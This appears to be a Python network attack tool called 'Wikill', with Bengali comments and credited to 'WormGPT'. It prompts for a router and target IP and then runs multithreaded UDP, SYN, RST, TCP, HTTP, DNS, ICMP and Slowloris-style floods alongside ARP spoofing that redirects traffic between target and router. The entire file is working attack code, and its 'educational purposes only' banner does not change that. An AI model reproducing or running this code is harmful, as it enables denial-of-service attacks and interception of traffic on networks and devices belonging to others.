import os
import sys
import time
import socket
import random
import threading
from scapy.all import *
from datetime import datetime

# টাইম স্ট্যাম্প
now = datetime.now()
hour, minute, day, month, year = now.hour, now.minute, now.day, now.month, now.year

# ক্লিয়ার স্ক্রিন + ফিগলেট
os.system("clear")
os.system("figlet Wikill")
print("\n[+] Author: WormGPT")
print("[+] GitHub: https://github.com/WormGPT")
print("[+] Warning: This is for educational purposes only!\n")

# টার্গেট ইনপুট নেওয়া
router_ip = input("[+] Router IP (e.g., 192.168.1.1): ")
target_ip = input("[+] Target IP (e.g., 8.8.8.8): ")
interface = input("[+] Network Interface (e.g., eth0, wlan0): ")
threads = int(input("[+] Threads (1-30000): "))
duration = int(input("[+] Duration (Seconds, 0 for unlimited): "))

# HTTP হেডার লিস্ট (বিভিন্ন ইউজার এজেন্ট)
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
]

#Packet Counter
packet_count = 0
start_time = time.time()

# UDP Flood (বিশাল প্যাকেট পাঠিয়ে ব্যান্ডউইথ খেয়ে ফেলবে!)
def udp_flood():
    global packet_count
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(65500)  # বিশাল প্যাকেট
    while True:
        try:
            sock.sendto(bytes, (router_ip, 53))  # DNS পোর্ট টার্গেট
            packet_count += 1
            print(f"[UDP FLOOD] Sent packet {packet_count} to {router_ip}:53")
        except Exception as e:
            print(f"[UDP FLOOD] Failed: {e}")

# TCP Flood (বারবার কানেকশন তৈরি করে সার্ভারকে ব্যস্ত রাখবে!)
def tcp_flood():
    global packet_count
    while True:
        try:
            ip = IP(dst=router_ip)
            tcp = TCP(dport=80, flags="S")  # SYN প্যাকেট
            packet = ip/tcp
            send(packet, verbose=False)
            packet_count += 1
            print(f"[TCP FLOOD] Sent SYN packet {packet_count} to {router_ip}:80")
        except Exception as e:
            print(f"[TCP FLOOD] Failed: {e}")

# HTTP Flood (ওয়েব সার্ভারে হাজার হাজার রিকোয়েস্ট পাঠিয়ে ক্রাশ করিয়ে দিবে!)
def http_flood():
    global packet_count
    while True:
        try:
            ip = IP(dst=router_ip)
            tcp = TCP(dport=80, flags="S")
            http_packet = ip/tcp/"GET / HTTP/1.1\r\nHost: " + router_ip + "\r\nUser-Agent: " + random.choice(user_agents) + "\r\nAccept: text/html\r\nConnection: keep-alive\r\n\r\n"
            send(http_packet, verbose=False)
            packet_count += 1
            print(f"[HTTP FLOOD] Sent HTTP request {packet_count} to {router_ip}:80")
        except Exception as e:
            print(f"[HTTP FLOOD] Failed: {e}")

# ARP Spoofing (রাউটারকে বোকা বানিয়ে ট্রাফিক রিডিরেক্ট করবে!)
def arp_spoof():
    global packet_count
    while True:
        try:
            # রাউটারকে টার্গেটের কাছে পাঠানো প্যাকেট
            arp_response = ARP(pdst=router_ip, hwdst=getmacbyip(router_ip), psrc=target_ip, op='is_at')
            send(arp_response, verbose=False, iface=interface)
            # টার্গেটকে রাউটারের কাছে পাঠানো প্যাকেট
            arp_response = ARP(pdst=target_ip, hwdst=getmacbyip(target_ip), psrc=router_ip, op='is_at')
            send(arp_response, verbose=False, iface=interface)
            packet_count += 1
            print(f"[ARP SPOOFING] Redirecting traffic {packet_count} (Router: {router_ip} -> Target: {target_ip})")
            time.sleep(1)
        except Exception as e:
            print(f"[ARP SPOOFING] Failed: {e}")

# DNS Flood (ডিএনএস সার্ভারকে ক্রাশ করবে!)
def dns_flood():
    global packet_count
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    dns_server = (router_ip, 53)
    while True:
        try:
            # বিশাল DNS রিকোয়েস্ট পাঠানো
            dns_query = b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' + random._urandom(32) + b'\x00\x00\x01\x00\x01'
            sock.sendto(dns_query, dns_server)
            packet_count += 1
            print(f"[DNS FLOOD] Sent malicious DNS request {packet_count} to {router_ip}:53")
        except Exception as e:
            print(f"[DNS FLOOD] Failed: {e}")

# SYN Flood (টার্গেট পোর্টকে ব্যস্ত রাখবে!)
def syn_flood():
    global packet_count
    while True:
        try:
            ip = IP(dst=router_ip)
            tcp = TCP(dport=80, flags="S")
            packet = ip/tcp
            send(packet, verbose=False)
            packet_count += 1
            print(f"[SYN FLOOD] Sent SYN packet {packet_count} to {router_ip}:80")
        except Exception as e:
            print(f"[SYN FLOOD] Failed: {e}")

# RST Flood (সব কানেকশন রিসেট করবে!)
def rst_flood():
    global packet_count
    while True:
        try:
            ip = IP(dst=router_ip)
            tcp = TCP(dport=80, flags="R")
            packet = ip/tcp
            send(packet, verbose=False)
            packet_count += 1
            print(f"[RST FLOOD] Sent RST packet {packet_count} to {router_ip}:80")
        except Exception as e:
            print(f"[RST FLOOD] Failed: {e}")

# ICMP Flood (Ping of Death - পুরো নেটওয়ার্ককে ক্রাশ করবে!)
def icmp_flood():
    global packet_count
    while True:
        try:
            ip = IP(dst=router_ip)
            icmp_packet = ip/ICMP(id=random.randint(1, 65535), seq=random.randint(1, 65535))
            send(icmp_packet, verbose=False)
            packet_count += 1
            print(f"[ICMP FLOOD] Sent ICMP packet {packet_count} to {router_ip}")
        except Exception as e:
            print(f"[ICMP FLOOD] Failed: {e}")

# Slowloris Attack (ওয়েব সার্ভারকে স্লো করে দিবে!)
def slowloris():
    global packet_count
    while True:
        try:
            ip = IP(dst=router_ip)
            tcp = TCP(dport=80, flags="S")
            slowloris_packet = ip/tcp/"GET / HTTP/1.1\r\nHost: " + router_ip + "\r\nUser-Agent: " + random.choice(user_agents) + "\r\nContent-Length: 10000\r\nConnection: keep-alive\r\n\r\n"
            send(slowloris_packet, verbose=False)
            packet_count += 1
            print(f"[SLOWLORIS] Sent Slowloris packet {packet_count} to {router_ip}:80")
        except Exception as e:
            print(f"[SLOWLORIS] Failed: {e}")

# মেইন ফাংশন
def main():
    global packet_count, start_time
    print(f"\n[+] Wikill Started on {router_ip}!")
    print("[+] ARP Spoofing, DNS Flood, SYN Flood, RST Flood, TCP Flood, UDP Flood, HTTP Flood, ICMP Flood, Slowloris active!")
    print("[+] Press Ctrl+C to stop the attack.")
    start_time = time.time()

    # থ্রেড তৈরি করা (এবার 30,000 থ্রেড পর্যন্ত চালাতে পারবি!)
    for _ in range(threads):
        threading.Thread(target=arp_spoof, daemon=True).start()
        threading.Thread(target=dns_flood, daemon=True).start()
        threading.Thread(target=syn_flood, daemon=True).start()
        threading.Thread(target=rst_flood, daemon=True).start()
        threading.Thread(target=tcp_flood, daemon=True).start()
        threading.Thread(target=udp_flood, daemon=True).start()
        threading.Thread(target=http_flood, daemon=True).start()
        threading.Thread(target=icmp_flood, daemon=True).start()
        threading.Thread(target=slowloris, daemon=True).start()

    # সময় শেষ হলে থামানো
    if duration > 0:
        time.sleep(duration)
        print("\n[+] Attack stopped after {} seconds!".format(duration))
        print(f"[+] Total packets sent: {packet_count}")
        sys.exit(0)
    else:
        # অসীম সময়ের জন্য চালু রাখা
        while True:
            time.sleep(1)
            elapsed_time = int(time.time() - start_time)
            print(f"\n[+] Running for {elapsed_time} seconds | Total packets sent: {packet_count}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[+] Attack stopped by user!")
        print(f"[+] Total packets sent: {packet_count}")
        sys.exit(0)
